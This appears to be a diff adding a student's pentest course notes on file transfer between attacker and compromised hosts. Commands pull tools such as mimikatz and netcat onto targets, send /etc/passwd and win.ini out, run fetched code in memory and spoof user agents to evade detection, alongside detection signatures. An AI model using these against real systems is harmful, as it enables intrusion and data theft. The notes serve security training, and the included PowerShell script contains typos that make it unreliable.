@@ -665,4 +665,542 @@ And then use the following cmd on the compromised machine to connect to Netcat t
 And now with Ncat:
 `$ sudo ncat -l -p 443 --send-only < SharpKatz.exe`
 `$ ncat <atk-host-ip-addr> 443 --recv-only > SharpKatz.exe`
-If Netcat or Ncat are not installed on the compromised machine, Bash supports read/write
+If Netcat or Ncat are not installed on the compromised machine, Bash supports read/write ops on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).
+
+Writing to the particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.
+*With Netcat*
+`$ sudo nc -l -p 443 -q 0 < SharpKatz.exe`
+*With Ncat*
+`$ sudo ncat -l -p 443 --send-only < SharpKatz.exe`
+*Compromised Machine Using /dev/TCP to Recv File*
+`$ cat < /dev/tcp/<atk-host-ip>/443 > SharpKatz.exe`
+*Note: The same operation can be used to transfer files from the compromised host to your atk machine.*
+### PowerShell Session File Transfer
+PowerShell file transfers have already been discussed, but there may be scenarios where `HTTP`, `HTTPS`, or `SMB` are unavailable. In those cases, you'd use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer ops.
+
+[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows the possibility to execute scripts or cmds on a remote comp using PowerShell sessions. Admins commonly use PowerShell Remoting to mng remote comps in a network, and you can also use it for file transfer ops. By default, enabling PowerShell Remoting creates both an `HTTP` and an `HTTPS` listener. The listeners run on the default ports `TCP/5985` for `HTTP` and `TCP/5986` for `HTTPS`.
+
+To create a PowerShell Remoting session on a remote comp, it is req'd to have either admin access, be a member of the `Remote Management Users` group, or have explicit perms for PowerShell Remoting in the session config. 
+
+The following example shows how to transfer a file to and from `DC01` and `DATABASE01`. In it, the user have an `admin` session in `DC01`, admin rights on `DATABASE01`, and PowerShell Remoting is enabled. `Test-NetConnection` is used to confirm that the user can connect to WinRM.
+
+```powershell
+PS C:\htb> whoami
+
+htb\administrator
+
+PS C:\htb> hostname
+
+DC01
+
+PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
+
+ComputerName     : DATABASE01
+RemoteAddress    : 192.168.1.101
+RemotePort       : 5985
+InterfaceAlias   : Ethernet0
+SourceAddress    : 192.168.1.100
+TcpTestSecceeded : True
+```
+Creds don't need to be specified b/c this session already has privs o/ `DATABASE01`. In the next example, a session is created to the remote comp named `DATABASE01` and stores the results in the var named `$Session`.
+```powershell
+PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
+```
+Then, the `Copy-Item` cmdlet to copy a file from the local machine `DC01` to the `DATABASE01` session have `$Session` and vice versa:
+```powershell
+# Copy samplefile.txt from Localhost to the DATABASE01 session
+PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+
+# Copy DATABASE.txt from DATABASE01 Session to the Localhost
+PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+### RDP
+`Remote Desktop Protocol` (`RDP`) is commonly used in Windows networks for remote access. Files can be transferred using RDP by copying and pasting. Right-click and copy a file from the Windows machine you connected to and paste it into the RDP session.
+
+`xfreerdp` and `rdesktop` are two tools that can be used if the Windows machine is connected to from a Linux atk host. Both can be used to exposed a local folder in the remote RDP session.
+#### Mounting a Linux Folder Using xfreerdp
+`$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0' /drive:linux,/home/plaintext/htb/academy/filetransfer`
+#### Mounting a Linux Folder Using rdesktop
+`$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files`
+To access the dir, connect to `\\tsclient\`, which allows the transfer of files to and from the RDP session.![[Pasted image 20240603161148.png]]
+Alternatively, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can also be used.![[Pasted image 20240603161322.png]]After selecting the drive, you can then interact w it in the remote session that follows.
+*Note: This drive is not accessible to any other users logged on to the target computer, even if they mng to hijack the RDP session.*
+### Practice Makes Perfect
+It's worth referencing this section or creating your own notes on these techniques and applying them to labs in other modules in the Pentester Job Role Path and beyond. Some modules/sections where these could come in handy include:
+- `Active Directory Enumeration and Attacks` - Skills Assessments 1 & 2
+- Throughout the `Pivoting, Tunnelling & Port Forwarding` module
+- Throughout the `Attacking Enterprise Networks` module
+- Throughout the `Shells & Payloads` module
+You never know what you're up against until you start a lab (or real-world assessment). Once you master one technique in this section or other sections of this module, try another. By the time you finish the Pentester Job Role Path, it is ideal to have tried most, if not all, of these techniques. This will help your "muscle memory" and give you ideas of how to upload/download files when you face a diff env w certain restrictions that make one easier method fail. The next section will discuss protecting file transfers when dealing w sensitive data.
+## Protected File Transfers
+Pentesters often gain access to highly sensitive data such as user lists, creds (e.g. downloading the NTDS.dit file for offline passwd cracking), enumeration data that can contain critical info about the org's network infrastructure, Active Directory (AD) env, etc. Therefore, it is essential to enc this data or use enc data connections such as `SSH`, `SFTP`, and `HTTPS`. However, sometimes these options are not avail and a diff approach is req'd, like enc the data or files before a transfer, to prevent the data from being read if intercepted in transit.
+> [!Very Important Note]
+> Unless specifically requested by a client, do NOT exfiltrate data such as Personal Identifiable Information (PII), financial data (e.g. credit card nums), trade secrets, etc., from a client env. Instead, if attempting to test Data Loss Prevention (DLP) ctrls/egress filtering prots, create a file w dummy data that mimics the data that the client is trying to protect.
+
+Data leakage during a pentest could have severe consequences for the pentester, their co, and the client. As an infosec professional, you must act professionally and responsibly and take all measures to protect any data you encounter during an assessment.
+### File Encryption on Windows
+There are many methods the can be used to enc files and info on Windows sys's. One of the simplest methods is the Invoke-[AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) PowerShell script. This script is small and provides enc of files and strings.
+#### Invoke-AESEncryption.ps1
+```powershell
+.EXAMPLE
+Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"
+
+Description
+-----------
+Encrypts the string "Secret Text" and outputs a Base64 encoded ciphertext.
+
+.EXAMPLE
+Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
+
+Description
+-----------
+Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plaintext.
+
+.EXAMPLE
+Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
+
+Description
+-----------
+Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
+
+.EXAMPLE
+Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
+
+Description
+-----------
+Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
+
+#>
+function Invoke-AESEncryption {
+	[CmdletBinding()]
+	[OutputType([string])]
+	Param
+	(
+		[Parameter(Mandatory = $true)]
+		[ValidatSet('Encrypt', 'Decrypt')]
+		[String]$Mode,
+		
+		[Parameter(Mandatory = $true)]
+		[String]$Key,
+		
+		[Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
+		[String]$Text,
+		
+		[Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
+		[String]$Path
+	)
+	
+	Begin {
+		$shaManaged = New-Object System.Security.Cryptography.SHA256Managed
+		$aesManaged = New-Object System.Security.Cryptography.AesManaged
+		$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+		$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+		$aesManaged.BlockSize = 128
+		$aesManaged.KeySize = 256
+	}
+	
+	Process {
+		$aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+	
+		switch ($Mode) {
+			'Encrypt' {
+				if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+				
+				if ($Path) {
+					$File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+					if (!$File.FullName) {
+						Write-Error -Message "File not found!"
+						break
+					}
+					$plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+					$outPath = $File.FullName + ".aes"
+				}
+				
+				$encryptor = $aesManaged.CreateEncryptor()
+				$encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+				$encryptedBytes = $aesManaged.IV + $encryptedBytes
+				$aesManaged.Dispose()
+				
+				if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
+				
+				if ($Path) {
+					[System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+					(Get-Item $outPath).LastWriteItem = $File.LastWriteTime
+					return "File encrypted to $outPath"
+				}
+			}
+			'Decrypt' {
+				if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
+				
+				if ($Path) {
+					$File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+					if (!$File.FullName) {
+						Write-Error -Message "File not found!"
+						break
+					}
+					$cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+					$outPath = $File.FullName -replace ".aes"
+				}
+				
+				$aesManaged.IV = $cipherBytes[0..15]
+				$decryptor = $aesManaged.CreateDecryptor()
+				$decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
+				$aesManaged.Dispose()
+				
+				if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
+				
+				if ($Path) {
+					[System.IO.File]::WriteAllBytes($outPath, $decryptBytes)
+					(Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+					return "File decrypted to $outPath"
+				}
+			}
+		}
+	}
+	
+	End {
+		$shaManaged.Dispose()
+		$aesManaged.Dispose()
+	}
+}
+```
+Any of the previously discussed file transfer methods can be used to get this file onto a target host. After the script has ben transferred, it only needs to be imported as a module using the following cmd.
+`PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1`
+After the script is imported, it can encrypt strings or files, as shown in the following examples. This cmd creates an enc file w the same name as the enc file but w the "`.aes`" ext.
+```powershell
+PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
+
+File encrypted to C:\htb\scan-results.txt.aes
+PS C:\htb> ls
+
+    Directory: C:\htb
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        11/18/2020  12:17 AM           9734 Invoke-AESEncryption.ps1
+-a----        11/18/2020  12:19 PM           1724 scan-results.txt
+-a----        11/18/2020  12:20 PM           3448 scan-results.txt.aes
+```
+Using v `strong` and `unique` passwds for enc for every co. where a pentest is performed is essential for preventing sensitive files and info from being decrypted using one single passwd that may have been leaked and cracked by a third party.
+### File Encryption on Linux
+[OpenSSL](https://www.openssl.org/) is freq included in Linux distros, w sysadmins using it to gen sec certs, among other tasks. OpenSSL can be used to send files "nc style" to enc files.
+
+To encrypt a file using `openssl`, we can select diff ciphers, see [OpenSSL man page](https://www.openssl.org/docs/man1.1.1/man1/openssl-enc.html). Using `-aes256` as an example, you can also override the default iterations counts w the option `-iter 100000` and add the option `-pbkdf2` to use the Password-Based Key Derivation Function 2 alg, which will prompt for a passwd after hitting `enter`:
+#### Encrypting /etc/passwd with openssl
+```shell
+$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
+
+enter aes-256-cbc encryption password:                                                         
+Verifying - enter aes-256-cbc encryption password:  
+```
+Remember to use a strong and unique passwd to avoid brute-force cracking atks should an unauth party obtain the file. To decrypt the file, use a cmd like the following:
+#### Decrypt passwd.enc with openssl
+```shell
+$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    
+
+enter aes-256-cbc decryption password:
+```
+Use any of the previous methods to transfer this file, but it is recommended to use a sec transport method such as HTTPS, SFTP, or SSH. As always, practice these examples against target hosts in this or other modules and reproduce what you can (such as the `openssl` examples using the Pwnbox). The following section will cover diff ways to transfer files o/ HTTP and HTTPS.
+## Catching Files over HTTP/S
+### HTTP/S
+Web transfer is the most common way most people transfer files b/c `HTTP`/`HTTPS` are the most common protocols allowed through fw's. Another immense benefit is that, in many cases, the file will be enc in transit. There is nothing worse than being on a pentest, and a client's network IDS picks up on a sensitive file being transferred o/ plaintext and having them ask why the pentester sent a passwd to their cloud server w/o using enc.
+
+[Python3's uploadserver module](https://github.com/Densaugeo/uploadserver) to set up a web server w upload capabilities, but Apache or Nginx can also be used. This section will cover creating a sec webserver for file upload ops.
+### Nginx - Enabling PUT
+A good alternative for file transfer to `Apache` is [Nginx](https://www.nginx.com/resources/wiki/) b/c the config is less complicated, and the module sys does not lead to sec issues as `Apache` can.
+
+When allowing `HTTP` uploads, it is critical to be 100% positive that users cannot upload web shells and execute them. `Apache` makes it easy to shoot yourself in the foot w this, as the `PHP` module loves to execute anything ending in `PHP`. Config'ing `Nginx` to use `PHP` is nowhere near as simple.
+#### Create a dir to handle uploaded files
+`$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory`
+#### Change the Owner to www-data
+`$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory`
+#### Create Nginx Config File
+Create the Nginx config file by creating the file `/etc/nginx/sites-available/upload.conf` w the following contents:
+```shell
+server {
+	listen 9001;
+	
+	location /SecretUploadDirectory/ {
+		root    /var/www/uploads;
+		dav_methods PUT;
+	}
+}
+```
+#### Symlink Your Site to the sites-enabled Directory
+`$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/`
+#### Start Nginx
+`$ sudo systemctl restart nginx.service`
+Error messages are written in the file `/var/log/nginx/error.log`. The following error example finds that port 80 is already in use and how to troubleshoot it:
+#### Verifying Errors
+```shell
+$ tail -2 /var/log/nginx/error.log
+
+2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)
+2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()
+
+$ ss -lnpt | grep 80
+
+LISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:(("python",pid=`2811`,fd=3),("python",pid=2070,fd=3),("python",pid=1968,fd=3),("python",pid=1856,fd=3))
+
+$ ps -ef | grep 2811
+
+user65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`
+root        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811
+```
+#### Remove NginxDefault Config
+The above shell session shows there is already a module listening on put 80. To get around this, remove the default Nginx config, which binds on port 80.
+`$ sudo rm /etc/nginx/sites-enabled/default`
+#### Upload File Using cURL
+Now test uploading by using `cURL` to send a `PUT` request. The following example shows how to upload the `/etc/passwd` file to the server and call it users.txt
+```shell
+$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
+
+$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 
+
+user65:x:1000:1000:,,,:/home/user65:/bin/bash
+```
+Once this is working, a good test is to ensure the dir listing is not enabled by navigating to `http://localhost/SecretUploadDirectory`. By default, w `Apache`, if a dir w/o an index file (`index.html`) is found, it will list all the files. This is bad for the use-case of exfilling files b/c most files are sensitive by nature, and pentesters want to do their best to hide them. Thanks to `Nginx` being minimal, features like that are not enabled by default.
+### Using Built-in Tools
+The next session will introduce the topic of "Living off the Land" or using built-in Windows and Linux util to perform file transfer activities. This concept will repeated be referenced throughout the modules in the Pentester path when covering tasks such as Windows and Linux priv escalation and Active Directory enum and exploitation.
+## Living off the Land
+The phrase "Living off the Land" was coined by Christopher Campbell [@obscuresec](https://twitter.com/obscuresec) and Matt Graeber [@mattifestation](https://twitter.com/mattifestation) at [DerbyCon3](https://www.youtube.com/watch?v=j-r6UonEkUw).
+
+The term LOLBins (Living off the Land Binaries) came from a Twitter discussion on what to call binaries that an atkr can use to perform actions beyond their original purpose. There are currently two webites that aggregate info on Living off the Land binaries:
+- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
+- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)
+LOLBins can be used to perform funcs such as:
+- Download
+- Upload
+- Cmd Exec
+- File Read
+- File Write
+- Bypasses
+This section will focus on using LOLBAS and GTFOBins proj's and provide examples for download and upload func's on Windows & Linux sys's.
+### Using the LOLBAS and GTFOBins Projects
+[LOLBAS for Windows](https://lolbas-project.github.io/#) and [GTFOBins for Linux](https://gtfobins.github.io/) are websites where that can be searched for binaries that can be used for different functions.
+#### LOLBAS
+To search for download and upload functions in [LOLBAS](https://lolbas-project.github.io/), use `/download` or `/upload`.![[Pasted image 20240603192410.png]]
+The following example uses [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/):
+##### Upload win.ini to atk host
+It is necessary to listen on a port on the atk host for incoming traff using Netcat and then exec certreq.exe to upload a file.
+```cmd
+C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
+Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
+```
+##### File Received in Netcat Session
+This will send the file to the Netcat session, and its contents can be copy-pasted.
+```shell
+$ sudo nc -lvnp 8000
+
+listening on [any] 8000 ...
+connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
+POST / HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Pragma: no-cache
+Content-Type: application/json
+User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
+Content-Length: 92
+Host: 192.168.49.128:8000
+
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+```
+If you get an error when running `certreq.exe`, the version you are using may not contain the `-Post` parameter. You can download an updated version [here](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) and try again.
+#### GTFOBins
+To search for the download and upload func in the [GTFOBins for Linux Binaries](https://gtfobins.github.io/), use `+file download` or `+file upload`.![[Pasted image 20240603193133.png]]
+The following uses [OpenSSL](https://www.openssl.org/), which is freq installed and often included in other software distros, w sysadmins using it to gen sec certs, among other tasks. OpenSSL can be used to send files "nc style."
+
+##### Create Certs in Atk Host
+It is necessary to create a cert and start a server in the atk host.
+```shell
+$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+
+Generating a RSA private key
+.......................................................................................................+++++
+................+++++
+writing new private key to 'key.pem'
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:
+Email Address []:
+```
+##### Stand up the Server in the Atk Host
+```shell
+$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+```
+##### Download File from Compromised Machine
+Next, w the server running, download the file from the compromised machine.
+```shell
+$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+```
+### Other Common Living off the Land tools
+#### Bitsadmin Download Function
+The [Background Intelligent Transfer Services (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.
+##### File Download w Bitsadmin
+```powershell
+PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
+```
+##### Download
+PowerShell also enables interaction w BITS, enables file downloads and uploads, supports creds, and can use specified proxy servers.
+```powershell
+PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+```
+#### Certutil
+Casey Smith [@subTee](https://twitter.com/subtee?lang=en) found that Certutil can be used to download arbitrary files. It is avail in all Windows versions and has been a popular file transfer technique, serving as a de facto `wget` for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.
+##### Download a File w Certutil
+```cmd
+C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+```
+### Extra Practice
+It's worth perusing the LOLBAS and GTFOBins websites and experimenting w as many file transfer methods as possible. The more obscure, the better. You never know when you'll need on of these binaries during an assessment, and it'll save time if you already have detailed notes on multiple options. Some of the binaries that can be leveraged for file transfers may surprise you.
+
+The final two sections will touch open detection considerations regarding file transfers and some steps that can be taken to evade detection if the assessment scope calls for evasive testing.
+# Detect or Be Detected
+## Detection
+Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation. However, although the proc of whitelisting all cmd lines in a particular env is initially time-consuming, it is very robust and allows for quick detection and alerting on any unusual cmd lines.
+
+Most client-server protocols req the client and server to negotiate how content will be delivered before exchanging info. This is common w the `HTTP` protocol. There is a need for interoperability amongst diff web servers and web browser types to ensure that users have the same exp no matter their browser. `HTTP` clients are most readily recognized by their user agent string, which the server uses to ID which `HTTP` client is connecting to it, i.e. Firefox, Chrome, etc.
+
+User agents are not only used to ID web browsers, but anything acting as an `HTTP` client and connecting to a web server via `HTTP` can have a user agent string (i.e. `cURL`, a custom `Python` script, or common tools such as `sqlmap` or `nmap`).
+
+Orgs can take some steps to ID potential user agent strings by first building a list of known legit user agent str, user agents used by default OS procs, common user agents used by update services such as Windows Update, and AV updates, etc. These can be fed into a SIEM tool used for threat hunting to filter out legit traff and focus on anomalies that may indicate sus behavior. Any sus-looking user agent str's can then be further investigated to determine whether they were used to perform malicious actions. [This website](http://useragentstring.com/index.php) is handy for IDing common user agent str's. A list of user agent str's is avail [here](http://useragentstring.com/index.php).
+
+Malicious file transfers can also be detected by their user agents. The following user agents/headers were observed from common `HTTP` transfer techniques (tested on Windows 10, version 10.0.14393, w PowerShell 5).
+#### Invoke-WebRequest - Client
+```powershell
+PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
+PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
+```
+#### Invoke-WebRequest - Server
+```shell
+GET /nc.exe HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
+```
+#### WinHttpRequest - Client
+```powershell
+PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
+PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
+PS C:\htb> $h.send();
+PS C:\htb> iex $h.ResponseText
+```
+#### WinHttpRequest - Server
+```shell
+GET /nc.exe HTTP/1.1
+Connection: Keep-Alive
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
+```
+#### Msxml2 - Client
+```powershell
+PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
+PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
+PS C:\htb> $h.send();
+PS C:\htb> iex $h.responseText
+```
+#### Msxml2 - Server
+```shell
+GET /nc.exe HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+UA-CPU: AMD64
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
+```
+#### Certutil - Client
+```cmd
+C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
+C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
+```
+#### Certutil - Server
+```shell
+GET /nc.exe HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Pragma: no-cache
+Accept: */*
+User-Agent: Microsoft-CryptoAPI/10.0
+```
+#### BITS - Client
+```powershell
+PS C:\htb> Import-Module bitstransfer;
+PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
+PS C:\htb> $r=gc $env:temp\t;
+PS C:\htb> rm $env:temp\t; 
+PS C:\htb> iex $r
+```
+#### BITS - Server
+```shell
+HEAD /nc.exe HTTP/1.1
+Connection: Keep-Alive
+Accept: */*
+Accept-Encoding: identity
+User-Agent: Microsoft BITS/7.8
+```
+This section just scratches the surface on detecting malicious file transfers. It would be an excellent start for any org to create a whitelist of allowed binaries or a blacklist of binaries known to be used for malicious purposes. Furthermore, hunting for anomalous user agent str's can be an excellent way to catch an atk in progress. In-depth threat hunting and detection techniques will be covered in later modules.
+## Evading Detection
+### Changing User Agent
+If diligent admins or defenders have blacklisted any of these User Agents, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a User Agent param, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari, e.g. if Chrome is used internally, setting this User Agent may make the request seem legit.
+#### Listing out User Agents
+```powershell
+PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
+
+Name       : InternetExplorer
+User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)
+
+Name       : FireFox
+User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0
+
+Name       : Chrome
+User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
+             Safari/534.6
+
+Name       : Opera
+User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1
+
+Name       : Safari
+User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
+             Safari/533.16
+```
+Invoking Invoke-WebRequests to download nc.exe using a Chrome User Agent
+#### Request w Chrome User Agent
+```powershell
+PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+```
+```shell
+$ nc -lvnp 80
+
+listening on [any] 80 ...
+connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
+GET /nc.exe HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
+(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
+Host: 10.10.10.32
+Connection: Keep-Alive
+```
+### LOLBAS / GTFOBins
+App whitelisting may prevent you from using PowerShell or Netcat, and cmd-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively known as "misplaced trust binaries."  An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some sys's and contains functionality to download config files periodically. This download functionality can be invoked as follows:
+#### Transferring File w GfxDownloadWrapper.exe
+```powershell
+PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
+```
+Such a binary might be permitted to run by app whitelisting and be excluded from alerting. Other, more commonly avail bins are also avail, and it is worth checking the [LOLBAS](https://lolbas-project.github.io/) proj to find a suitable "file download" bin that exists in your env. Linux's equivalent is the [GTFOBins](https://gtfobins.github.io/) proj and is definitely also worth checking out. As of the time of writing, the GTFOBins proj provides useful info on nearly 40 commonly installed bins that can be used to perform file transfers.
+### Closing Thoughts
+This module has discussed many ways to transfer files to and from an atk host b/w Windows and Linux sys's. It's worth practicing as many of these as possible throughout the modules in the Pentester path. Got a web shell on a target? Try downloading a file to the target for additional enum using Certutil. Need to download a file off the target? Try an Impacket SMB server or a Python web server w upload capabilities. Refer back to this module periodically and strive to use all the methods taught here in some fashion. Also, take some time whenever you're working on a target or lab to search for a LOLBin or GTFOBin that you've never worked w b4 to accomplish your file transfer goals.
